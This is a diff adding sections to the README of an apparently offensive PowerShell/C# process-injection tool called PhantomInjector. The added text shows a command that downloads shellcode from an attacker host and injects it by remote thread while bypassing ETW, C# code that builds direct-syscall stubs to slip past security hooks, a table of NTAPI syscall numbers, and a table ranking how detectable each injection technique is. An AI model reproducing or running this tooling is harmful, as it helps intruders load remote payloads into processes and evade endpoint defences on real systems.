@@ -77,6 +77,15 @@ Invoke-PhantomInjector `
   -InjectionMethod GhostProcess
 ```
 
+### 4. Syscall-Only Injection
+
+```powershell
+Invoke-PhantomInjector -PayloadUrl http://attacker/sc.bin `
+    -UseSyscalls `
+    -InjectionMethod RemoteThread `
+    -BypassETW
+```
+
 ---
 
 ## Technical Deep Dive
@@ -131,6 +140,60 @@ sequenceDiagram
 ```csharp
 Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
 ```
+
+#### Syscall Implementation 
+```mermaid
+sequenceDiagram
+    participant P as PowerShell
+    participant M as Memory
+    participant K as Kernel
+
+    P->>M: Allocate stub memory (RWX)
+    P->>M: Write syscall assembly
+    P->>K: Execute via SYSCALL
+    alt Success
+        K-->>P: Return status
+    else Failure
+        K-->>P: NTSTATUS error
+        P->>P: Fallback to WinAPI
+    end
+```
+
+```csharp
+byte[] CreateSyscallStub(uint syscallId) {
+    return new byte[] {
+        0x4C, 0x8B, 0xD1,             // mov r10, rcx
+        0xB8,                          // mov eax [next 4 bytes]
+        (byte)(syscallId & 0xFF),      // syscall ID low byte
+        (byte)((syscallId >> 8) & 0xFF),
+        (byte)((syscallId >> 16) & 0xFF),
+        (byte)((syscallId >> 24) & 0xFF),
+        0x0F, 0x05,                    // syscall
+        0xC3                           // ret
+    };
+}
+```
+
+**Supported NTAPI Functions**
+
+| Syscall          | Number | Usage Context        |
+|------------------|--------|----------------------|
+| `NtCreateThreadEx`  | 0xC0   | Thread Hijacking     |
+| `NtAllocateVirtualMemory` | 0x18   | Process Ghosting     |
+| `NtQueueApcThread` | 0x42   | APC Injection        |
+
+**Enhanced Detection Table**
+
+| Technique         | WinAPI Detection Risk | Syscall Detection Risk |
+|-------------------|-----------------------|------------------------|
+| APC Injection     | High                  | Medium                 |
+| Thread Hijacking  | Medium                | Low                    |
+| Process Ghosting  | High                  | Medium                 |
+
+---
+
+**Pro Tip**
+Combine with -UnhookNTDLL for clean syscall execution environment
 
 ---
 
